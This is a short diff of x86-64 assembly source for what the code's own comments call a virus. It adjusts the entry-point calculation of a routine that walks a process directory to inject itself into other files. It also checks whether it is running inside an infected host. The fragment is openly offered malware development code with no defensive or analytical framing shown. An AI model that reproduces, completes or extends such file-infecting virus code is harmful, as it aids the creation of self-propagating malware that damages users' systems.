@@ -59,8 +59,11 @@ _inject:
 	lea rdi, [rel process_dir]
 	push 1
 	pop rsi ; mode for move_through_dir
+
 	call _move_through_dir
 	pop r8; pop addr from stack
+	sub r8, 0x5; sub call instr
+
 	cmp rax, 0x0
 	jne _end
 
@@ -68,9 +71,9 @@ _inject:
 
 	%ifdef DEBUG
 		mov rdi, r8
+		add rdi, 0x5
 		call _print; _print(rdi)
 	%endif
-	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus
 
 	xor rsi, rsi ; mode for move_through_dir
@@ -90,6 +93,7 @@ _end:
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jne .infected
+
 	mov rax, 60 ; exit
 	xor rdi, rdi; = 0
 	syscall
